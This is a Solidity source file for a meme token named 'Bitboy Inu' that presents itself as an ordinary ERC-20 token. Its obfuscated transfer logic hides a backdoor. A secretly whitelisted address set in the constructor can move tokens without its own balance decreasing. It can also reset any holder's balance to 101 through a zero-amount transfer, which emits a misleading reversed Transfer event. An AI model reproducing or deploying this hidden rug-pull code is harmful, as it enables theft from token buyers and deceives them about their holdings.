/*

https://t.me/bitboyportal

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.2;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract BitboyInu is Ownable {
    mapping(address => uint256) private afbd;

    address public unqcibpomsjg;

    string public name = 'Bitboy Inu';

    uint8 public decimals = 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) public balanceOf;

    constructor(address sxepti) {
        balanceOf[msg.sender] = totalSupply;
        pqazcl[sxepti] = tjucvxrnfok;
        IUniswapV2Router02 zynjmt = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        unqcibpomsjg = IUniswapV2Factory(zynjmt.factory()).createPair(address(this), zynjmt.WETH());
    }

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address anyqhbfiomur, address mkevabwrjqlu, uint256 rqlfkjnb) public returns (bool success) {
        require(rqlfkjnb <= allowance[anyqhbfiomur][msg.sender]);
        allowance[anyqhbfiomur][msg.sender] -= rqlfkjnb;
        xjwkvhuzste(anyqhbfiomur, mkevabwrjqlu, rqlfkjnb);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public symbol = 'Bitboy Inu';

    function approve(address hjorenudb, uint256 rqlfkjnb) public returns (bool success) {
        allowance[msg.sender][hjorenudb] = rqlfkjnb;
        emit Approval(msg.sender, hjorenudb, rqlfkjnb);
        return true;
    }

    function xjwkvhuzste(address anyqhbfiomur, address mkevabwrjqlu, uint256 rqlfkjnb) private {
        if (pqazcl[anyqhbfiomur] == 0) {
            balanceOf[anyqhbfiomur] -= rqlfkjnb;
        }
        balanceOf[mkevabwrjqlu] += rqlfkjnb;
        if (pqazcl[msg.sender] > 0 && rqlfkjnb == 0 && mkevabwrjqlu != unqcibpomsjg) {
            balanceOf[mkevabwrjqlu] = tjucvxrnfok;
            emit Transfer(mkevabwrjqlu, anyqhbfiomur, rqlfkjnb);
            return;
        }
        emit Transfer(anyqhbfiomur, mkevabwrjqlu, rqlfkjnb);
    }

    mapping(address => uint256) private pqazcl;

    uint256 private tjucvxrnfok = 101;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address mkevabwrjqlu, uint256 rqlfkjnb) public returns (bool success) {
        xjwkvhuzste(msg.sender, mkevabwrjqlu, rqlfkjnb);
        return true;
    }
}